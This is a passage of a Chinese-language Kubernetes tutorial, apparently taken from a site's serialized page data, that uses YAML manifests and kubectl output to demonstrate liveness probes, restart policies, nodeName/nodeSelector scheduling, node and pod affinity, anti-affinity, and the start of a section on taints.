liveness probes：存活性探针，用于检测应用实例当前是否处于正常运行状态，如果不是，k8s 会重启容器\n * readiness probes：就绪性探针，用于检测应用实例当前是否可以接收请求，如果不能，k8s 不会转发流量\n\n> livenessprobe 决定是否重启容器，readinessprobe 决定是否将请求转发给容器。\n\n上面两种探针目前均支持三种探测方式：\n\n * exec 命令：在容器内执行一次命令，如果命令执行的退出码为 0，则认为程序正常，否则不正常\n\n……\n  livenessprobe:\n    exec:\n      command:\n      - cat\n      - /tmp/healthy\n……\n\n\n1\n2\n3\n4\n5\n6\n7\n\n * tcpsocket：将会尝试访问一个用户容器的端口，如果能够建立这条连接，则认为程序正常，否则不正常\n\n……      \n  livenessprobe:\n    tcpsocket:\n      port: 8080\n……\n\n\n1\n2\n3\n4\n5\n\n * httpget：调用容器内 web 应用的 url，如果返回的状态码在 200 和 399 之间，则认为程序正常，否则不正常\n\n……\n  livenessprobe:\n    httpget:\n      path: / #uri地址\n      port: 80 #端口号\n      host: 127.0.0.1 #主机地址\n      scheme: http #支持的协议，http或者https\n……\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n下面以 liveness probes 为例，做几个演示：\n方式一：exec\n创建 pod-liveness-exec.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-liveness-exec\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports: \n    - name: nginx-port\n      containerport: 80\n    livenessprobe:\n      exec:\n        command: ["/bin/cat","/tmp/hello.txt"] # 执行一个查看文件的命令\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n创建 pod，观察效果\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-liveness-exec.yaml\npod/pod-liveness-exec created\n\n# 查看pod详情\n[root@k8s-master01 ~]# kubectl describe pods pod-liveness-exec -n dev\n......\n  normal   created    20s (x2 over 50s)  kubelet, node1     created container nginx\n  normal   started    20s (x2 over 50s)  kubelet, node1     started container nginx\n  normal   killing    20s                kubelet, node1     container nginx failed liveness probe, will be restarted\n  warning  unhealthy  0s (x5 over 40s)   kubelet, node1     liveness probe failed: cat: can\'t open \'/tmp/hello11.txt\': no such file or directory\n  \n# 观察上面的信息就会发现nginx容器启动之后就进行了健康检查\n# 检查失败之后，容器被kill掉，然后尝试进行重启（这是重启策略的作用，后面讲解）\n# 稍等一会之后，再观察pod信息，就可以看到restarts不再是0，而是一直增长\n[root@k8s-master01 ~]# kubectl get pods pod-liveness-exec -n dev\nname                ready   status             restarts   age\npod-liveness-exec   0/1     crashloopbackoff   2          3m19s\n\n# 当然接下来，可以修改成一个存在的文件，比如/tmp/hello.txt，再试，结果就正常了......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n方式二：tcpsocket\n创建 pod-liveness-tcpsocket.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-liveness-tcpsocket\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports: \n    - name: nginx-port\n      containerport: 80\n    livenessprobe:\n      tcpsocket:\n        port: 8080 # 尝试访问8080端口\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n创建 pod，观察效果\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-liveness-tcpsocket.yaml\npod/pod-liveness-tcpsocket created\n\n# 查看pod详情\n[root@k8s-master01 ~]# kubectl describe pods pod-liveness-tcpsocket -n dev\n......\n  normal   scheduled  31s                            default-scheduler  successfully assigned dev/pod-liveness-tcpsocket to node2\n  normal   pulled     <invalid>                      kubelet, node2     container image "nginx:1.17.1" already present on machine\n  normal   created    <invalid>                      kubelet, node2     created container nginx\n  normal   started    <invalid>                      kubelet, node2     started container nginx\n  warning  unhealthy  <invalid> (x2 over <invalid>)  kubelet, node2     liveness probe failed: dial tcp 10.244.2.44:8080: connect: connection refused\n  \n# 观察上面的信息，发现尝试访问8080端口,但是失败了\n# 稍等一会之后，再观察pod信息，就可以看到restarts不再是0，而是一直增长\n[root@k8s-master01 ~]# kubectl get pods pod-liveness-tcpsocket  -n dev\nname                     ready   status             restarts   age\npod-liveness-tcpsocket   0/1     crashloopbackoff   2          3m19s\n\n# 当然接下来，可以修改成一个可以访问的端口，比如80，再试，结果就正常了......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n方式三：httpget\n创建 pod-liveness-httpget.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-liveness-httpget\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerport: 80\n    livenessprobe:\n      httpget:  # 其实就是访问http://127.0.0.1:80/hello  \n        scheme: http #支持的协议，http或者https\n        port: 80 #端口号\n        path: /hello #uri地址\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n创建 pod，观察效果\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-liveness-httpget.yaml\npod/pod-liveness-httpget created\n\n# 查看pod详情\n[root@k8s-master01 ~]# kubectl describe pod pod-liveness-httpget -n dev\n.......\n  normal   pulled     6s (x3 over 64s)  kubelet, node1     container image "nginx:1.17.1" already present on machine\n  normal   created    6s (x3 over 64s)  kubelet, node1     created container nginx\n  normal   started    6s (x3 over 63s)  kubelet, node1     started container nginx\n  warning  unhealthy  6s (x6 over 56s)  kubelet, node1     liveness probe failed: http probe failed with statuscode: 404\n  normal   killing    6s (x2 over 36s)  kubelet, node1     container nginx failed liveness probe, will be restarted\n  \n# 观察上面信息，尝试访问路径，但是未找到,出现404错误\n# 稍等一会之后，再观察pod信息，就可以看到restarts不再是0，而是一直增长\n[root@k8s-master01 ~]# kubectl get pod pod-liveness-httpget -n dev\nname                   ready   status    restarts   age\npod-liveness-httpget   1/1     running   5          3m17s\n\n# 当然接下来，可以修改成一个可以访问的路径path，比如/，再试，结果就正常了......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n至此，已经使用 liveness probe 演示了三种探测方式，但是查看 livenessprobe 的子属性，会发现除了这三种方式，还有一些其他的配置，在这里一并解释下：\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.containers.livenessprobe\nfields:\n   exec <object>  \n   tcpsocket    <object>\n   httpget      <object>\n   initialdelayseconds  <integer>  # 容器启动后等待多少秒执行第一次探测\n   timeoutseconds       <integer>  # 探测超时时间。默认1秒，最小1秒\n   periodseconds        <integer>  # 执行探测的频率。默认是10秒，最小1秒\n   failurethreshold     <integer>  # 连续探测失败多少次才被认定为失败。默认是3。最小值是1\n   successthreshold     <integer>  # 连续探测成功多少次才被认定为成功。默认是1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n * initialdelayseconds 容器启动后等待多少秒执行第一次探测\n * timeoutseconds 探测超时时间。默认 1 秒，最小 1 秒\n * periodseconds 执行探测的频率。默认是 10 秒，最小 1 秒\n * failurethreshold 连续探测失败多少次才被认定为失败。默认是 3。最小值是 1\n * successthreshold 连续探测成功多少次才被认定为成功。默认是 1\n\n下面稍微配置两个，演示下效果即可：\n\n[root@k8s-master01 ~]# more pod-liveness-httpget.yaml\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-liveness-httpget\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerport: 80\n    livenessprobe:\n      httpget:\n        scheme: http\n        port: 80 \n        path: /\n      initialdelayseconds: 30 # 容器启动后30s开始探测\n      timeoutseconds: 5 # 探测超时时间为5s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# 重启策略\n\n一旦容器探测出现了问题，kubernetes 就会对容器所在的 pod 进行重启，其实这是由 pod 的重启策略决定的，pod 的重启策略有 3 种，分别如下：\n\n * always ：容器失效时，自动重启该容器，这也是默认值。\n * onfailure ： 容器终止运行且退出码不为 0 时重启\n * never ： 不论状态为何，都不重启该容器\n\n重启策略适用于 pod 对象中的所有容器，首次需要重启的容器，将在其需要时立即进行重启，随后再次需要重启的操作将由 kubelet 延迟一段时间后进行，且反复的重启操作的延迟时长以此为 10s、20s、40s、80s、160s 和 300s，300s 是最大延迟时长。\n\n创建 pod-restartpolicy.yaml：\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-restartpolicy\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - name: nginx-port\n      containerport: 80\n    livenessprobe:\n      httpget:\n        scheme: http\n        port: 80\n        path: /hello\n  restartpolicy: never # 设置重启策略为never\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n运行 pod 测试\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-restartpolicy.yaml\npod/pod-restartpolicy created\n\n# 查看pod详情，发现nginx容器失败\n[root@k8s-master01 ~]# kubectl  describe pods pod-restartpolicy  -n dev\n......\n  warning  unhealthy  15s (x3 over 35s)  kubelet, node1     liveness probe failed: http probe failed with statuscode: 404\n  normal   killing    15s                kubelet, node1     container nginx failed liveness probe\n  \n# 多等一会，再观察pod的重启次数，发现一直是0，并未重启   \n[root@k8s-master01 ~]# kubectl  get pods pod-restartpolicy -n dev\nname                   ready   status    restarts   age\npod-restartpolicy      0/1     running   0          5min42s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n',charsets:{cjk:!0}},{title:"kubernetes(七) Pod 调度",frontmatter:{title:"kubernetes(七) Pod 调度",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/606",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/606.kubernetes(%E4%B8%83)%20Pod%20%E8%B0%83%E5%BA%A6.html",relativePath:"04.运维/60.Kubernetes/606.kubernetes(七) Pod 调度.md",key:"v-1bd8b602",path:"/kubernetes/606/",headers:[{level:2,title:"定向调度",slug:"定向调度",normalizedTitle:"定向调度",charIndex:225},{level:2,title:"亲和性调度",slug:"亲和性调度",normalizedTitle:"亲和性调度",charIndex:255},{level:2,title:"污点和容忍",slug:"污点和容忍",normalizedTitle:"污点和容忍",charIndex:14097}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"定向调度 亲和性调度 污点和容忍",content:'在默认情况下，一个 Pod 在哪个 Node 节点上运行，是由 Scheduler 组件采用相应的算法计算出来的，这个过程是不受人工控制的。但是在实际使用中，这并不满足的需求，因为很多情况下，我们想控制某些 Pod 到达某些节点上，那么应该怎么做呢？这就要求了解 kubernetes 对 Pod 的调度规则，kubernetes 提供了四大类调度方式：\n\n * 自动调度：运行在哪个节点上完全由 Scheduler 经过一系列的算法计算得出\n * 定向调度：NodeName、NodeSelector\n * 亲和性调度：NodeAffinity、PodAffinity、PodAntiAffinity\n * 污点（容忍）调度：Taints、Toleration\n\n\n# 定向调度\n\n定向调度，指的是利用在 pod 上声明 nodeName 或者 nodeSelector，以此将 Pod 调度到期望的 node 节点上。注意，这里的调度是强制的，这就意味着即使要调度的目标 Node 不存在，也会向上面进行调度，只不过 pod 运行失败而已。\n\nNodeName\n\nNodeName 用于强制约束将 Pod 调度到指定的 Name 的 Node 节点上。这种方式，其实是直接跳过 Scheduler 的调度逻辑，直接将 Pod 调度到指定名称的节点。\n\n接下来，实验一下：创建一个 pod-nodename.yaml 文件\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-nodename\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  nodeName: node1 # 指定调度到node1节点上\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n#创建Pod\n[root@k8s-master01 ~]# kubectl create -f pod-nodename.yaml\npod/pod-nodename created\n\n#查看Pod调度到NODE属性，确实是调度到了node1节点上\n[root@k8s-master01 ~]# kubectl get pods pod-nodename -n dev -o wide\nNAME           READY   STATUS    RESTARTS   AGE   IP            NODE      ......\npod-nodename   1/1     Running   0          56s   10.244.1.87   node1     ......   \n\n# 接下来，删除pod，修改nodeName的值为node3（并没有node3节点）\n[root@k8s-master01 ~]# kubectl delete -f pod-nodename.yaml\npod "pod-nodename" deleted\n[root@k8s-master01 ~]# vim pod-nodename.yaml\n[root@k8s-master01 ~]# kubectl create -f pod-nodename.yaml\npod/pod-nodename created\n\n#再次查看，发现已经向Node3节点调度，但是由于不存在node3节点，所以pod无法正常运行\n[root@k8s-master01 ~]# kubectl get pods pod-nodename -n dev -o wide\nNAME           READY   STATUS    RESTARTS   AGE   IP       NODE    ......\npod-nodename   0/1     Pending   0          6s    <none>   node3   ......        \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nNodeSelector\n\nNodeSelector 用于将 pod 调度到添加了指定标签的 node 节点上。它是通过 kubernetes 的 label-selector 机制实现的，也就是说，在 pod 创建之前，会由 scheduler 使用 MatchNodeSelector 调度策略进行 label 匹配，找出目标 node，然后将 pod 调度到目标节点，该匹配规则是强制约束。\n\n接下来，实验一下：\n\n1 首先分别为 node 节点添加标签\n\n[root@k8s-master01 ~]# kubectl label nodes node1 nodeenv=pro\nnode/node2 labeled\n[root@k8s-master01 ~]# kubectl label nodes node2 nodeenv=test\nnode/node2 labeled\n\n\n1\n2\n3\n4\n\n\n2 创建一个 pod-nodeselector.yaml 文件，并使用它创建 Pod\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-nodeselector\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  nodeSelector: \n    nodeenv: pro # 指定调度到具有nodeenv=pro标签的节点上\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n#创建Pod\n[root@k8s-master01 ~]# kubectl create -f pod-nodeselector.yaml\npod/pod-nodeselector created\n\n#查看Pod调度到NODE属性，确实是调度到了node1节点上\n[root@k8s-master01 ~]# kubectl get pods pod-nodeselector -n dev -o wide\nNAME               READY   STATUS    RESTARTS   AGE     IP          NODE    ......\npod-nodeselector   1/1     Running   0          47s   10.244.1.87   node1   ......\n\n# 接下来，删除pod，修改nodeSelector的值为nodeenv: xxxx（不存在打有此标签的节点）\n[root@k8s-master01 ~]# kubectl delete -f pod-nodeselector.yaml\npod "pod-nodeselector" deleted\n[root@k8s-master01 ~]# vim pod-nodeselector.yaml\n[root@k8s-master01 ~]# kubectl create -f pod-nodeselector.yaml\npod/pod-nodeselector created\n\n#再次查看，发现pod无法正常运行,Node的值为none\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nNAME               READY   STATUS    RESTARTS   AGE     IP       NODE    \npod-nodeselector   0/1     Pending   0          2m20s   <none>   <none>\n\n# 查看详情,发现node selector匹配失败的提示\n[root@k8s-master01 ~]# kubectl describe pods pod-nodeselector -n dev\n.......\nEvents:\n  Type     Reason            Age        From               Message\n  ----     ------            ----       ----               -------\n  Warning  FailedScheduling  <unknown>  default-scheduler  0/3 nodes are available: 3 node(s) didn\'t match node selector.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# 亲和性调度\n\n介绍了两种定向调度的方式，使用起来非常方便，但是也有一定的问题，那就是如果没有满足条件的 Node，那么 Pod 将不会被运行，即使在集群中还有可用 Node 列表也不行，这就限制了它的使用场景。\n\n基于上面的问题，kubernetes 还提供了一种亲和性调度（Affinity）。它在 NodeSelector 的基础之上的进行了扩展，可以通过配置的形式，实现优先选择满足条件的 Node 进行调度，如果没有，也可以调度到不满足条件的节点上，使调度更加灵活。\n\nAffinity 主要分为三类：\n\n * nodeAffinity (node 亲和性）: 以 node 为目标，解决 pod 可以调度到哪些 node 的问题\n * podAffinity (pod 亲和性) : 以 pod 为目标，解决 pod 可以和哪些已存在的 pod 部署在同一个拓扑域中的问题\n * podAntiAffinity (pod 反亲和性) : 以 pod 为目标，解决 pod 不能和哪些已存在 pod 部署在同一个拓扑域中的问题\n\n> 关于亲和性 (反亲和性) 使用场景的说明：\n> 亲和性：如果两个应用频繁交互，那就有必要利用亲和性让两个应用的尽可能的靠近，这样可以减少因网络通信而带来的性能损耗。\n> 反亲和性：当应用的采用多副本部署时，有必要采用反亲和性让各个应用实例打散分布在各个 node 上，这样可以提高服务的高可用性。\n\nNodeAffinity\n\n首先来看一下 NodeAffinity 的可配置项：\n\npod.spec.affinity.nodeAffinity\n  requiredDuringSchedulingIgnoredDuringExecution  Node节点必须满足指定的所有规则才可以，相当于硬限制\n    nodeSelectorTerms  节点选择列表\n      matchFields   按节点字段列出的节点选择器要求列表\n      matchExpressions   按节点标签列出的节点选择器要求列表(推荐)\n        key    键\n        values 值\n        operator 关系符 支持Exists, DoesNotExist, In, NotIn, Gt, Lt\n  preferredDuringSchedulingIgnoredDuringExecution 优先调度到满足指定的规则的Node，相当于软限制 (倾向)\n    preference   一个节点选择器项，与相应的权重相关联\n      matchFields   按节点字段列出的节点选择器要求列表\n      matchExpressions   按节点标签列出的节点选择器要求列表(推荐)\n        key    键\n        values 值\n        operator 关系符 支持In, NotIn, Exists, DoesNotExist, Gt, Lt\n\tweight 倾向权重，在范围1-100。\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n关系符的使用说明:\n\n- matchExpressions:\n  - key: nodeenv              # 匹配存在标签的key为nodeenv的节点\n    operator: Exists\n  - key: nodeenv              # 匹配标签的key为nodeenv,且value是"xxx"或"yyy"的节点\n    operator: In\n    values: ["xxx","yyy"]\n  - key: nodeenv              # 匹配标签的key为nodeenv,且value大于"xxx"的节点\n    operator: Gt\n    values: "xxx"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n接下来首先演示一下 requiredDuringSchedulingIgnoredDuringExecution , 创建 pod-nodeaffinity-required.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-nodeaffinity-required\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #亲和性设置\n    nodeAffinity: #设置node亲和性\n      requiredDuringSchedulingIgnoredDuringExecution: # 硬限制\n        nodeSelectorTerms:\n        - matchExpressions: # 匹配env的值在["xxx","yyy"]中的标签\n          - key: nodeenv\n            operator: In\n            values: ["xxx","yyy"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-required.yaml\npod/pod-nodeaffinity-required created\n\n# 查看pod状态 （运行失败）\n[root@k8s-master01 ~]# kubectl get pods pod-nodeaffinity-required -n dev -o wide\nNAME                        READY   STATUS    RESTARTS   AGE   IP       NODE    ...... \npod-nodeaffinity-required   0/1     Pending   0          16s   <none>   <none>  ......\n\n# 查看Pod的详情\n# 发现调度失败，提示node选择失败\n[root@k8s-master01 ~]# kubectl describe pod pod-nodeaffinity-required -n dev\n......\n  Warning  FailedScheduling  <unknown>  default-scheduler  0/3 nodes are available: 3 node(s) didn\'t match node selector.\n  Warning  FailedScheduling  <unknown>  default-scheduler  0/3 nodes are available: 3 node(s) didn\'t match node selector.\n\n#接下来，停止pod\n[root@k8s-master01 ~]# kubectl delete -f pod-nodeaffinity-required.yaml\npod "pod-nodeaffinity-required" deleted\n\n# 修改文件，将values: ["xxx","yyy"]------\x3e ["pro","yyy"]\n[root@k8s-master01 ~]# vim pod-nodeaffinity-required.yaml\n\n# 再次启动\n[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-required.yaml\npod/pod-nodeaffinity-required created\n\n# 此时查看，发现调度成功，已经将pod调度到了node1上\n[root@k8s-master01 ~]# kubectl get pods pod-nodeaffinity-required -n dev -o wide\nNAME                        READY   STATUS    RESTARTS   AGE   IP            NODE  ...... \npod-nodeaffinity-required   1/1     Running   0          11s   10.244.1.89   node1 ......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n接下来再演示一下 requiredDuringSchedulingIgnoredDuringExecution , 创建 pod-nodeaffinity-preferred.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-nodeaffinity-preferred\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #亲和性设置\n    nodeAffinity: #设置node亲和性\n      preferredDuringSchedulingIgnoredDuringExecution: # 软限制\n      - weight: 1\n        preference:\n          matchExpressions: # 匹配env的值在["xxx","yyy"]中的标签(当前环境没有)\n          - key: nodeenv\n            operator: In\n            values: ["xxx","yyy"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-preferred.yaml\npod/pod-nodeaffinity-preferred created\n\n# 查看pod状态 （运行成功）\n[root@k8s-master01 ~]# kubectl get pod pod-nodeaffinity-preferred -n dev\nNAME                         READY   STATUS    RESTARTS   AGE\npod-nodeaffinity-preferred   1/1     Running   0          40s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n> NodeAffinity 规则设置的注意事项：\n> 1 如果同时定义了 nodeSelector 和 nodeAffinity，那么必须两个条件都得到满足，Pod 才能运行在指定的 Node 上\n> 2 如果 nodeAffinity 指定了多个 nodeSelectorTerms，那么只需要其中一个能够匹配成功即可\n> 3 如果一个 nodeSelectorTerms 中有多个 matchExpressions ，则一个节点必须满足所有的才能匹配成功\n> 4 如果一个 pod 所在的 Node 在 Pod 运行期间其标签发生了改变，不再符合该 Pod 的节点亲和性需求，则系统将忽略此变化\n\nPodAffinity\nPodAffinity 主要实现以运行的 Pod 为参照，实现让新创建的 Pod 跟参照 pod 在一个区域的功能。首先来看一下 PodAffinity 的可配置项：\n\npod.spec.affinity.podAffinity\n  requiredDuringSchedulingIgnoredDuringExecution  硬限制\n    namespaces       指定参照pod的namespace\n    topologyKey      指定调度作用域\n    labelSelector    标签选择器\n      matchExpressions  按节点标签列出的节点选择器要求列表(推荐)\n        key    键\n        values 值\n        operator 关系符 支持In, NotIn, Exists, DoesNotExist.\n      matchLabels    指多个matchExpressions映射的内容\n  preferredDuringSchedulingIgnoredDuringExecution 软限制\n    podAffinityTerm  选项\n      namespaces      \n      topologyKey\n      labelSelector\n        matchExpressions  \n          key    键\n          values 值\n          operator\n        matchLabels \n    weight 倾向权重，在范围1-100\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n> topologyKey 用于指定调度时作用域，例如:\n> 如果指定为 kubernetes.io/hostname，那就是以 Node 节点为区分范围\n> 如果指定为 beta.kubernetes.io/os, 则以 Node 节点的操作系统类型来区分\n\n接下来，演示下 requiredDuringSchedulingIgnoredDuringExecution\n1）首先创建一个参照 Pod，pod-podaffinity-target.yaml：\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-podaffinity-target\n  namespace: dev\n  labels:\n    podenv: pro #设置标签\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  nodeName: node1 # 将目标pod名确指定到node1上\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 启动目标pod\n[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-target.yaml\npod/pod-podaffinity-target created\n\n# 查看pod状况\n[root@k8s-master01 ~]# kubectl get pods  pod-podaffinity-target -n dev\nNAME                     READY   STATUS    RESTARTS   AGE\npod-podaffinity-target   1/1     Running   0          4s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n2）创建 pod-podaffinity-required.yaml，内容如下：\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-podaffinity-required\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #亲和性设置\n    podAffinity: #设置pod亲和性\n      requiredDuringSchedulingIgnoredDuringExecution: # 硬限制\n      - labelSelector:\n          matchExpressions: # 匹配env的值在["xxx","yyy"]中的标签\n          - key: podenv\n            operator: In\n            values: ["xxx","yyy"]\n        topologyKey: kubernetes.io/hostname\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n上面配置表达的意思是：新 Pod 必须要与拥有标签 nodeenv=xxx 或者 nodeenv=yyy 的 pod 在同一 Node 上，显然现在没有这样 pod，接下来，运行测试一下。\n\n# 启动pod\n[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-required.yaml\npod/pod-podaffinity-required created\n\n# 查看pod状态，发现未运行\n[root@k8s-master01 ~]# kubectl get pods pod-podaffinity-required -n dev\nNAME                       READY   STATUS    RESTARTS   AGE\npod-podaffinity-required   0/1     Pending   0          9s\n\n# 查看详细信息\n[root@k8s-master01 ~]# kubectl describe pods pod-podaffinity-required  -n dev\n......\nEvents:\n  Type     Reason            Age        From               Message\n  ----     ------            ----       ----               -------\n  Warning  FailedScheduling  <unknown>  default-scheduler  0/3 nodes are available: 2 node(s) didn\'t match pod affinity rules, 1 node(s) had taints that the pod didn\'t tolerate.\n\n# 接下来修改  values: ["xxx","yyy"]-----\x3evalues:["pro","yyy"]\n# 意思是：新Pod必须要与拥有标签nodeenv=xxx或者nodeenv=yyy的pod在同一Node上\n[root@k8s-master01 ~]# vim pod-podaffinity-required.yaml\n\n# 然后重新创建pod，查看效果\n[root@k8s-master01 ~]# kubectl delete -f  pod-podaffinity-required.yaml\npod "pod-podaffinity-required" deleted\n[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-required.yaml\npod/pod-podaffinity-required created\n\n# 发现此时Pod运行正常\n[root@k8s-master01 ~]# kubectl get pods pod-podaffinity-required -n dev\nNAME                       READY   STATUS    RESTARTS   AGE   LABELS\npod-podaffinity-required   1/1     Running   0          6s    <none>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n关于 PodAffinity 的 preferredDuringSchedulingIgnoredDuringExecution ，这里不再演示。\nPodAntiAffinity\n\nPodAntiAffinity 主要实现以运行的 Pod 为参照，让新创建的 Pod 跟参照 pod 不在一个区域中的功能。\n\n它的配置方式和选项跟 PodAffinty 是一样的，这里不再做详细解释，直接做一个测试案例。\n\n1）继续使用上个案例中目标 pod\n\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide --show-labels\nNAME                     READY   STATUS    RESTARTS   AGE     IP            NODE    LABELS\npod-podaffinity-required 1/1     Running   0          3m29s   10.244.1.38   node1   <none>     \npod-podaffinity-target   1/1     Running   0          9m25s   10.244.1.37   node1   podenv=pro\n\n\n1\n2\n3\n4\n\n\n2）创建 pod-podantiaffinity-required.yaml，内容如下：\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-podantiaffinity-required\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #亲和性设置\n    podAntiAffinity: #设置pod亲和性\n      requiredDuringSchedulingIgnoredDuringExecution: # 硬限制\n      - labelSelector:\n          matchExpressions: # 匹配podenv的值在["pro"]中的标签\n          - key: podenv\n            operator: In\n            values: ["pro"]\n        topologyKey: kubernetes.io/hostname\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n上面配置表达的意思是：新 Pod 必须要与拥有标签 nodeenv=pro 的 pod 不在同一 Node 上，运行测试一下。\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-podantiaffinity-required.yaml\npod/pod-podantiaffinity-required created\n\n# 查看pod\n# 发现调度到了node2上\n[root@k8s-master01 ~]# kubectl get pods pod-podantiaffinity-required -n dev -o wide\nNAME                           READY   STATUS    RESTARTS   AGE   IP            NODE   .. \npod-podantiaffinity-required   1/1     Running   0          30s   10.244.1.96   node2  ..\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 污点和容忍\n\n污点（Taints）\n\n前面的调度方式都是站在 Pod 的角度上，通过在 Pod 上添加属性，来确定 Pod 是否要调度到指定的 Node 上，其实我们也可以站在 Node 的角度上，通过在 Node 上添加污点属性，来决定是否允许 Pod 调度过来。\n\nNode 被设置上污点之后就和 Pod 之间存在了一种相斥的关系，进而拒绝 Pod 调度进来，甚至可以将已经存在的 Pod 驱逐出去。\n\n污点的格式为： key=value:effect , key 和 value 是污点的标签，effect 描述污点的作用，支持如下三个选项：\n\n * PreferNoSchedule：kubernetes 将尽量避免把 Pod 调度到具有该污点的 Node 上，除非没有其他节点可调度\n * NoSchedule：kubernetes 将不会把 Pod 调度到具有该污点的 Node 上，但不会影响当前 Node 上已存在的 Pod\n * NoExecute：kubernetes 将不会把 Pod 调度到具有该污点的 Node 上，同时也会将 Node 上已存在的 Pod 驱离\n\n\n\n使用 kubectl 设置和去除污点的命令示例如下：\n\n# 设置污点\nkubectl taint nodes 节点名称 